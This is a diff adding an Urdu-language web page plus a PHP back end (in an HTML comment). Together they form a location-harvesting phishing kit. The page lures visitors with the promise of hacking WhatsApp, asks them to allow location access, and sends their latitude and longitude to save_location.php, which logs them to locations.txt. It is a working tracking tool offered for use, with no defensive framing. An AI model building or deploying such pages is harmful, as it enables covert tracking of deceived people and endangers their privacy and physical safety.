@@ -1,0 +1,96 @@
+
+<!--
+  ====== PHP Code (save_location.php) ======
+  <?php
+  if ($_SERVER['REQUEST_METHOD'] === 'POST') {
+      $lat = $_POST['lat'] ?? '0';
+      $lon = $_POST['lon'] ?? '0';
+      $data = date("Y-m-d H:i:s") . " | Latitude: $lat | Longitude: $lon\n";
+      file_put_contents("locations.txt", $data, FILE_APPEND);
+      echo "Location Saved";
+  } else {
+      echo "Invalid Request";
+  }
+  ?>
+-->
+
+<!DOCTYPE html>
+<html lang="ur">
+<head>
+  <meta charset="UTF-8">
+  <title>📍 لوکیشن کی اجازت دیں</title>
+  <style>
+    body {
+      background-color: black;
+      color: lime;
+      font-family: 'Jameel Noori Nastaleeq', sans-serif;
+      text-align: center;
+      padding: 50px;
+    }
+    .location-box {
+      margin-top: 30px;
+      background-color: #111;
+      border: 2px dashed lime;
+      padding: 20px;
+      font-size: 20px;
+      border-radius: 15px;
+      display: inline-block;
+    }
+    button {
+      margin-top: 20px;
+      background-color: lime;
+      color: black;
+      border: none;
+      padding: 10px 20px;
+      font-size: 18px;
+      border-radius: 10px;
+      cursor: pointer;
+    }
+    button:hover {
+      background-color: #0f0;
+    }
+  </style>
+</head>
+<body>
+
+  <h1>⚠️ واٹس ایپ ہیک کرنے سے پہلے پرمیشن Allow کریں</h1>
+  <button onclick="getLocation()">📍 لوکیشن Allow کریں</button>
+  <div class="location-box" id="location">ابھی تک کوئی لوکیشن موصول نہیں ہوئی۔</div>
+
+  <script>
+    function sendLocation(lat, lon) {
+      fetch("save_location.php", {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/x-www-form-urlencoded",
+        },
+        body: "lat=" + lat + "&lon=" + lon
+      }).then(response => response.text()).then(data => {
+        document.getElementById('location').innerHTML += "<br><br>✅ لوکیشن کامیابی سے بھیج دی گئی!";
+      }).catch(error => {
+        document.getElementById('location').innerHTML += "<br><br>❌ لوکیشن بھیجنے میں مسئلہ ہوا!";
+      });
+    }
+
+    function showPosition(position) {
+      var lat = position.coords.latitude;
+      var lon = position.coords.longitude;
+      document.getElementById('location').innerHTML = "📌 آپ کی لوکیشن: <br> Latitude: " + lat + "<br>Longitude: " + lon;
+      sendLocation(lat, lon);
+    }
+
+    function showError(error) {
+      document.getElementById('location').innerHTML = "❌ لوکیشن حاصل نہیں ہو سکی۔ اجازت دیں یا دوبارہ کوشش کریں۔";
+    }
+
+    function getLocation() {
+      if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(showPosition, showError);
+      } else {
+        document.getElementById('location').innerHTML = "❌ آپ کا براؤزر لوکیشن کو سپورٹ نہیں کرتا۔";
+      }
+    }
+  </script>
+
+</body>
+</html>
